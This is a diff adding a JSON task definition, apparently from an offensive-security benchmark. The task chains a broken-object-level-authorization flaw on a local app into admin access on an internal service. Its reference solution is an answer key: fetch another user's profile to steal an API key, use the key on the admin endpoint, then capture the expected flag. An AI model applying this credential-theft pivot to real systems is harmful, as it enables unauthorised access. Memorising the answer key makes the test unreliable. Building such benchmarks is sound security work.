@@ -1,0 +1,24 @@
+{
+  "name": "002-pivot-admin",
+  "objective": "Turn a BOLA on the app into admin on the internal service.",
+  "targets": [
+    { "script": "bench/targets/authz/app.mjs", "port": 8093, "readyPath": "/public" },
+    { "script": "bench/targets/authz/internal.mjs", "port": 8094, "readyPath": "/internal/admin" }
+  ],
+  "reference": [
+    { "tool": "http_probe", "args": { "url": "http://127.0.0.1:8093/login?user=bob", "session": "bob" } },
+    { "tool": "http_probe", "args": { "url": "http://127.0.0.1:8093/users/alice/profile", "session": "bob" },
+      "capture": { "name": "api_key", "regex": "\"api_key\"\\s*:\\s*\"([^\"]+)\"" } },
+    { "tool": "http_probe", "args": {
+        "url": "http://127.0.0.1:8094/internal/admin",
+        "headers": { "X-Api-Key": "{{api_key}}" } },
+      "capture": { "name": "flag", "regex": "ARACHNID\\{[A-Z_]+\\}" } },
+    { "tool": "access_gain", "args": {
+        "host": "127.0.0.1:8094", "level": "admin",
+        "via": "api key leaked through BOLA on /users/alice/profile",
+        "credential": "{{api_key}}", "evidence": "{{flag}}" } }
+  ],
+  "verify": [
+    { "type": "flag", "value": "ARACHNID{PIVOT_ADMIN_OK}" }
+  ]
+}
